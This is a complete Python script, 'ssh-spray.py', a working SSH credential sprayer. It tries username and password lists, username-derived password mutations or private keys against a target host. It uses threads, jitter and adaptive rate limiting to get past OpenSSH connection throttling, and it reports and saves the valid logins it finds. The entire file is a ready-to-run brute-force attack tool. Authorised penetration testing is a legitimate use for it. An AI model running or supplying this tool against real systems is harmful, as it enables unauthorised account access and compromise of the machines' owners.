#!/usr/bin/env python3
"""
ssh-spray.py - adaptive SSH credential sprayer.

Target-agnostic: every host, user, and password comes from the command line
or from wordlist files. Nothing about any single engagement is baked in.

The point of this tool over `hydra -t 64` is honest accounting. OpenSSH
throttles inbound connections (MaxStartups), and a throttled connection is
NOT a failed login - it never reached authentication. Naive sprayers report
those as misses and hand you a false negative. This one classifies every
candidate as exactly one of:

    VALID     - authentication succeeded
    INVALID   - server definitively rejected the credential
    UNTESTED  - never reached authentication (throttled/network), after retries

and exits non-zero if anything is left UNTESTED, so a partial run can never
be mistaken for a clean negative.

Examples:
    ssh-spray.py -t 10.10.10.10 -U users.txt -W rockyou.txt --stop-on-success
    ssh-spray.py -t host -u admin -W pw.txt --mutate --out results.json
    ssh-spray.py -t host -C combos.txt          # user:pass per line
    ssh-spray.py -t host -U users.txt --key id_rsa
    ssh-spray.py -t host -U users.txt --user-as-pass
"""
import argparse
import itertools
import json
import queue
import random
import sys
import threading
import time

try:
    import paramiko
except ImportError:
    sys.exit("ssh-spray: paramiko is required (pip install paramiko)")

import logging
logging.getLogger("paramiko").setLevel(logging.CRITICAL)

VALID, INVALID, UNTESTED = "VALID", "INVALID", "UNTESTED"


def load_lines(path):
    """Read a wordlist, dropping blanks and #-comments, preserving order."""
    out = []
    with open(path, encoding="utf-8", errors="replace") as fh:
        for line in fh:
            line = line.rstrip("\r\n")
            if line and not line.lstrip().startswith("#"):
                out.append(line)
    return out


def dedupe(seq):
    return list(dict.fromkeys(seq))


def mutations(user):
    """Common username-derived password guesses. Opt-in via --mutate."""
    u, cap = user.lower(), user.capitalize()
    year = time.gmtime().tm_year
    return [user, u, cap, u + "123", cap + "123", u + "1", u + "!",
            u + "@123", cap + "@123", f"{u}{year}", f"{cap}{year}",
            f"{cap}{year}!", u + "2024", cap + "123!"]


class RateGovernor:
    """Adaptive pacing. Backs off hard when the server signals throttling and
    recovers slowly once attempts start landing again."""

    def __init__(self, rate, min_rate=0.2, verbose=False):
        self.max_rate = rate
        self.rate = rate
        self.min_rate = min_rate
        self.verbose = verbose
        self.lock = threading.Lock()
        self.next_slot = time.monotonic()
        self.clean = 0
        self.throttle_events = 0

    def wait(self, jitter=0.0):
        with self.lock:
            now = time.monotonic()
            slot = max(now, self.next_slot)
            self.next_slot = slot + (1.0 / self.rate)
        delay = slot - time.monotonic()
        if jitter:
            delay += random.uniform(0, jitter)
        if delay > 0:
            time.sleep(delay)

    def throttled(self):
        with self.lock:
            self.throttle_events += 1
            self.clean = 0
            old = self.rate
            self.rate = max(self.min_rate, self.rate / 2.0)
            # Stall the queue briefly so the server's backlog drains.
            self.next_slot = max(self.next_slot, time.monotonic()) + 2.0
            if self.verbose and self.rate != old:
                print(f"[~] throttled: rate {old:.2f} -> {self.rate:.2f}/s", flush=True)

    def ok(self):
        with self.lock:
            self.clean += 1
            if self.clean >= 25 and self.rate < self.max_rate:
                self.clean = 0
                self.rate = min(self.max_rate, self.rate * 1.3)


def attempt(args, user, password, key):
    """Return (status, detail). Only AuthenticationException is a real miss."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        kwargs = dict(hostname=args.target, port=args.port, username=user,
                      timeout=args.timeout, auth_timeout=args.timeout,
                      banner_timeout=args.timeout, allow_agent=False,
                      look_for_keys=False)
        if key is not None:
            kwargs["pkey"] = key
        else:
            kwargs["password"] = password
        client.connect(**kwargs)
        return VALID, None
    except paramiko.AuthenticationException:
        return INVALID, None
    except paramiko.BadHostKeyException as exc:
        return UNTESTED, f"host key: {exc}"
    except Exception as exc:                      # throttling, resets, timeouts
        return UNTESTED, f"{type(exc).__name__}: {exc}"
    finally:
        try:
            client.close()
        except Exception:
            pass


def main():
    ap = argparse.ArgumentParser(
        description="Adaptive SSH credential sprayer with honest UNTESTED accounting.",
        formatter_class=argparse.RawDescriptionHelpFormatter, epilog=__doc__)
    ap.add_argument("-t", "--target", required=True, help="host or IP")
    ap.add_argument("-p", "--port", type=int, default=22)

    ap.add_argument("-u", "--user", action="append", default=[], help="username (repeatable)")
    ap.add_argument("-U", "--userlist", help="file of usernames")
    ap.add_argument("-P", "--password", action="append", default=[], help="password (repeatable)")
    ap.add_argument("-W", "--passlist", help="file of passwords")
    ap.add_argument("-C", "--combos", help="file of user:pass pairs (splits on first colon)")
    ap.add_argument("--key", help="private key file (tries key auth instead of passwords)")
    ap.add_argument("--user-as-pass", action="store_true", help="also try password == username")
    ap.add_argument("--mutate", action="store_true", help="add username-derived password guesses")

    ap.add_argument("--rate", type=float, default=4.0, help="max attempts/sec (default 4)")
    ap.add_argument("--threads", type=int, default=6)
    ap.add_argument("--timeout", type=float, default=8.0)
    ap.add_argument("--jitter", type=float, default=0.0, help="random 0..N s added per attempt")
    ap.add_argument("--max-retries", type=int, default=4, help="retries for UNTESTED candidates")
    ap.add_argument("--stop-on-success", action="store_true")
    ap.add_argument("--out", help="write JSON results here")
    ap.add_argument("-v", "--verbose", action="store_true", help="log every attempt")
    args = ap.parse_args()

    key = None
    if args.key:
        for loader in (paramiko.Ed25519Key, paramiko.RSAKey, paramiko.ECDSAKey):
            try:
                key = loader.from_private_key_file(args.key)
                break
            except Exception:
                continue
        if key is None:
            sys.exit(f"ssh-spray: could not load private key {args.key}")

    # ---- build the candidate list -------------------------------------
    candidates = []
    if args.combos:
        for line in load_lines(args.combos):
            u, _, p = line.partition(":")
            candidates.append((u, p))
    else:
        users = dedupe(args.user + (load_lines(args.userlist) if args.userlist else []))
        if not users:
            sys.exit("ssh-spray: need -u/-U (or -C)")
        if key is not None:
            candidates = [(u, None) for u in users]
        else:
            base = args.password + (load_lines(args.passlist) if args.passlist else [])
            for u in users:
                pws = list(base)
                if args.user_as_pass:
                    pws.append(u)
                if args.mutate:
                    pws += mutations(u)
                pws = dedupe(pws)
                if not pws:
                    sys.exit("ssh-spray: need -P/-W (or --user-as-pass/--mutate/--key)")
                candidates += [(u, p) for p in pws]
    candidates = dedupe(candidates)

    total = len(candidates)
    gov = RateGovernor(args.rate, verbose=args.verbose)
    work = queue.Queue()
    for c in candidates:
        work.put((c, 0))

    results = {}
    hits = []
    lock = threading.Lock()
    counter = itertools.count(1)
    found = threading.Event()

    def worker():
        while True:
            if found.is_set() and args.stop_on_success:
                return
            try:
                (user, password), tries = work.get_nowait()
            except queue.Empty:
                return
            gov.wait(args.jitter)
            status, detail = attempt(args, user, password, key)

            if status == UNTESTED and tries < args.max_retries:
                gov.throttled()
                time.sleep(min(2 ** tries, 15))
                work.put(((user, password), tries + 1))
                work.task_done()
                continue

            gov.throttled() if status == UNTESTED else gov.ok()
            shown = "<key>" if key is not None else password
            with lock:
                results[(user, password)] = (status, detail)
                n = next(counter)
                if status == VALID:
                    hits.append((user, password))
                    print(f"\n[+] VALID  {user}:{shown}", flush=True)
                    found.set()
                elif status == UNTESTED:
                    print(f"[!] UNTESTED {user}:{shown} -> {detail}", flush=True)
                elif args.verbose:
                    print(f"[-] {user}:{shown}", flush=True)
                if n % 50 == 0:
                    print(f"    ... {n}/{total} @ {gov.rate:.2f}/s", flush=True)
            work.task_done()

    auth = "key" if key is not None else "password"
    print(f"[*] {args.target}:{args.port} - {total} {auth} candidates, "
          f"{args.threads} threads, <={args.rate}/s", flush=True)
    started = time.monotonic()
    threads = [threading.Thread(target=worker, daemon=True) for _ in range(args.threads)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    elapsed = time.monotonic() - started

    tested = sum(1 for s, _ in results.values() if s in (VALID, INVALID))
    untested = [c for c, (s, _) in results.items() if s == UNTESTED]
    skipped = total - len(results)

    print(f"\n[*] {elapsed:.0f}s | tested {tested}/{total} | "
          f"untested {len(untested)} | skipped {skipped} | "
          f"throttle events {gov.throttle_events}")
    if hits:
        for u, p in hits:
            print(f"[+] VALID {u}:{'<key>' if key is not None else p}")
    else:
        print("[-] no valid credentials among TESTED candidates")
    if untested:
        print(f"[!] {len(untested)} candidate(s) never reached auth - "
              f"this is NOT a clean negative. Lower --rate/--threads and re-run.")

    if args.out:
        with open(args.out, "w", encoding="utf-8") as fh:
            json.dump({
                "target": args.target, "port": args.port, "auth": auth,
                "total": total, "tested": tested,
                "untested": [list(c) for c in untested],
                "skipped": skipped,
                "throttle_events": gov.throttle_events,
                "elapsed_sec": round(elapsed, 1),
                "valid": [{"username": u, "password": p} for u, p in hits],
            }, fh, indent=2)
        print(f"[*] results -> {args.out}")

    if hits:
        return 0
    return 2 if (untested or skipped) else 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
